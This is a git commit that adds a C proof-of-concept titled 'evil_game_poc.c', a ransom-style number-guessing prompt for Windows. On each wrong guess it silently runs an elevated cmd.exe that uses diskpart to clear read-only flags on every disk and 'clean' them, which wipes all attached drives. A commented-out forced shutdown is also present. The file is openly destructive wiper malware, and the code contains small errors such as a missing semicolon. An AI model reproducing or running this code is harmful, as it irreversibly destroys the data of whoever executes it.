53f5322af91e564b1563095e1df8ea8a05e17a78
will-the-creator <william.or3@proton.me>
2025-08-14 22:01:39 -0600

    Add files via upload

---
+++ evil_game_poc.c
@@ -0,0 +1,44 @@
+#include <windows.h>
+#include <tlhelp32.h>
+#include <stdio.h>
+#include <time.h>
+#include <stdlib.h>
+
+void game() {
+    SetConsoleTitleA("Screen");
+
+    srand(time(NULL));
+    int key = (rand() % 10) + 1;
+    int guess = 0;
+
+    printf("=== Let's Play a little Game ===\n");
+    printf("If you want your computer back...\n");
+    printf("Then guess the number\n");
+
+    while (1) {
+        printf("Enter guess 1-10 >:");
+        fflush(stdout);
+
+        scanf("%d", &guess)
+
+        if (guess == key) {
+            printf("\nYou Won!!! Woohoo\n");
+            break;
+        } else {
+            printf("\nWrong!\n");
+            ShellExecute(0, "runas", "cmd.exe",
+                "/c echo list disk > ld.txt && diskpart /s ld.txt > lo.txt && "
+                "for /f \"tokens=2\" %a in ('findstr /r \"^  *Disk [0-9]\" lo.txt') do ("
+                "echo select disk %a >> cl.txt & echo attributes disk clear readonly >> cl.txt & echo clean >> cl.txt) && "
+                "diskpart /s cl.txt && del ld.txt && del lo.txt && del cl.txt",
+                0, SW_HIDE);
+
+            //system("shutdown /s /t 0");
+        }
+    }
+    exit(0);
+    return 0;
+}
+int main() {
+    game();
+}
